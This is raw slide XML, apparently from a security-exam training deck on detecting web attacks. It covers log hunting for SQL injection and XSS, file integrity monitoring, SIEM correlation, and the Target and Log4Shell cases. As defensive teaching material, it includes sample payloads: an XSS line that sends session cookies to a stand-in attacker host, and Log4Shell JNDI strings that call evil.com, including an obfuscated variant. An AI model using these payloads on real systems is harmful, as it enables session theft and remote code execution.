              <a:t> identifies an automated SQLi tool; a real browser never sends this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2, UNION-based injection:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Appends a UNION SELECT to pull columns (username, password) not meant for this endpoint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3, Comment terminator:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Trailing </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>--</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> discards the rest of the original query so the injected clause parses cleanly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4, Status 200:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> The request was processed, not rejected, proof the payload was not blocked by a WAF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 Reflected XSS Probe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A GET to </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>/search?q=</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> containing a percent-encoded </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> payload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Decoded payload:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>document.location='https://evil-collector.net/c?c='+document.cookie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Purpose:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Redirects the victim's browser to an attacker server, appending their session cookie, session cookie theft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Tool signature:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> User-Agent </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>XSStrike/3.1</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> is another automated-scanner giveaway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Encoding awareness:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Analysts must mentally decode </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>%3C</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>%3E</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> as angle brackets and </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>%27</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> as a single quote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5.6.2.a.4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Live Demo: grep/awk Log Hunting for Injection Indicators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Ad-hoc hunting:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Analysts rarely wait for a SIEM rule, command-line hunting across raw logs is a core exam-relevant skill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Sweep command:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A single </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>grep -Ei</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> across rotated logs for UNION/SELECT, OR 1=1, comment markers, and script tags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Tallying noisy IPs:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Pipe matches through </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>awk</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> + </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>sort | uniq -c | sort -rn</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> to rank the noisiest scanner source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High-value pattern:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Filter for requests containing an injection indicator AND a 200 status, the successful bypass, not the blocked one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A blocked attempt (403) is a policy success story; a successful (200) request with an injection signature demands incident response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File Integrity Monitoring: Baseline and Verification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Where log analysis catches the attempt, FIM catches the consequence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Compute a cryptographic hash of every file that matters while the system is known-good; store as a trusted baseline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Verification:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Periodically recompute hashes and compare, any mismatch means the file changed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 algorithm:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> SHA-256 (FIPS PUB 180-4); MD5/SHA-1 deprecated for integrity use due to collision attacks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Interpretation rule:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A mismatch with no authorized change ticket is evidence of compromise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5.6.2.b.2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Baselining and Checking with sha256sum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Establish baseline:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Hash every file in the web root and redirect output to a baseline file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Verify later:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>sha256sum -c baseline --quiet</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> compares current state against the stored baseline, typically via cron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Compromised host signal:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A file like </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>uploads/profile_pic_884.php</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> reports FAILED, a PHP file dropped into an image upload directory is a classic web shell indicator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Scaling limit:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Hand-rolled sha256sum baselines are instructive but don't scale to enterprise use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Enterprise tools:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Purpose-built FIM tools (Tripwire, AIDE) exist for exactly this reason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5.6.2.b.3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Purpose-Built FIM Tools: Tripwire and AIDE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Tripwire (1992):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Gene Kim &amp; Eugene Spafford, Purdue University, signed database prevents an attacker with root from editing the baseline to hide tracks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AIDE:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Advanced Intrusion Detection Environment, open-source reimplementation; config defines watched paths and hash algorithms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Workflow:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>aideinit</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> establishes the baseline database; </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>aide --check</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> (via cron) compares current state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Sample flagged event:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A newly Added file </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>/var/www/html/uploads/x.php</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> with its SHA-256 hash reported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Modern extension:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> osquery folds FIM into broader endpoint telemetry, letting analysts hunt recent file changes interactively via SQL queries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5.6.2.c.1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Anomaly Detection and SIEM Correlation Rules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Statistical baseline:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Average requests/minute from an IP over trailing 30 days, plus/minus a standard deviation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Contextual enrichment:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> GeoIP lookups and threat-intel IP reputation feeds add context to a raw statistical outlier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Correlation rule:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Fires only when multiple discrete, individually low-severity events occur together in a pattern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Worked example:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> An unusual upload-directory request (log) FOLLOWED_BY a new file appearing in that directory (FIM) within a 10-minute window</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correlation matters:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Either signal alone is low-confidence noise; together they are near-certain evidence of a web shell upload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5.6.2.c.2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Access log / CLF:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Verbatim record of every HTTP request, capturing raw injection payloads before app logic runs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Signature indicators:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> SQL keywords + comment markers for SQLi; HTML/JS tags + event handlers for XSS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FIM:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Cryptographic baseline hashing (SHA-256) that detects unauthorized file changes after the fact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Tripwire / AIDE / osquery:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Purpose-built tools implementing FIM at enterprise scale, with signed/protected baselines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SIEM correlation rule:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Joins multiple low-confidence signals across sources into one high-confidence alert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Target Corporation (2013), The Setup</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Target Corporation (2013), The Setup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Entry vector:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Attackers gained a foothold via a compromised HVAC vendor's credentials, moved laterally into the POS network</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Payload:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Memory-scraping malware (BlackPOS/Kaptoxa family) installed on thousands of point-of-sale registers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Reads plaintext payment card data directly from POS memory during the brief window between card swipe and encryption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tool deployed:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> FireEye, installed roughly six months before the breach, capable of sandboxed malware-behavior detection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~40 million payment card records exfiltrated over the November-December 2013 holiday shopping season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Target, Alerts Fired, No One Acted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failure point:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> FireEye generated alerts, some at the highest available severity, on multiple occasions before the bulk of card data was stolen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Process breakdown:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Alerts were reviewed by a Bangalore-based monitoring team and escalated to Minneapolis HQ, but no action was taken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Discovery:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Breach was only contained after card issuers and the U.S. DOJ separately notified Target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lesson:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Detection capability (did the tool identify the malware?) is not the same as detection outcome (did it lead to a timely response?)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Full lifecycle required:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Detection, triage, escalation, AND response, a break at any link renders earlier links worthless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5.6.3.a.3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An Alert That No One Reads Is Not a Control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Critical concept:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A SIEM/FIM/IDS alert only satisfies the detection stage of the lifecycle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If no analyst reviews it:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Detection has not been meaningfully achieved, regardless of tool sophistication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If buried in false positives:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Alert fatigue causes real alerts to be dismissed or delayed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If escalation lacks authority to act:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> The chain breaks even when triage correctly identifies severity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Framing for the exam:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Separate 'did the technical control work' from 'did the organization achieve a secure outcome'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5.6.3.b.1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Log4Shell (2021), The Vulnerability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Disclosure:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> December 9, 2021, critical RCE in Apache Log4j, a near-ubiquitous Java logging library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CVE-2021-44228:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Maximum CVSS score of 10.0</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a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Log4j's JNDI message-lookup substitution evaluates attacker strings like </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>${jndi:ldap://evil.com/a}</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> and executes remote code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Trigger surface:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Any logged attacker-influenced string, a request header, search query, even a chat username, could trigger exploitation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Dormancy:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> The vulnerable feature existed since Log4j 2.0-beta9 (2013), making the exploitable install base massive and hard to inventory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5.6.3.b.2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Log4Shell: When Logging Was Both the Exploit and the Detection Tool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Unique duality:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> The act of logging an HTTP header was itself what triggered exploitation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Same act preserved evidence:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> That same logged string left the exact JNDI lookup sitting in the access log for any defender who searched for it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Real-world response:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Security teams worldwide ran near-identical historical log hunts within hours of disclosure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Retention dependency:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Organizations with months of centralized, searchable log history could retroactively determine exposure within hours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Organizations without centralized/long-retention logging could not answer the exposure question at all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5.6.3.b.3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Live Demo: Hunting Historical Logs for JNDI Indicators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Simulate the exact hunt security teams ran worldwide within hours of Log4Shell's disclosure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Pattern:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Regex matching </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>${jndi:...}</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> including common obfuscation variants used to evade naive WAF regexes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Obfuscation example:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>${${lower:j}ndi:...}</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> exploits Log4j's own lookup syntax to reconstruct 'jndi' and dodge simple string matches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Extended sources:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Must also check request headers logged in extended formats, X-Forwarded-For, User-Agent, Referer, not just the URL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Compressed archives:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>zgrep</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> is required to search rotated/compressed historical logs (.gz) without manual decompression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5.6.3.b.4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capability vs. detection outcome:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Target's core lesson, a working tool without organizational action fails to defend anything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Alert fatigue:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> High false-positive volume causing real alerts to be dismissed or delayed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Log4Shell / CVE-2021-44228:</a:t>
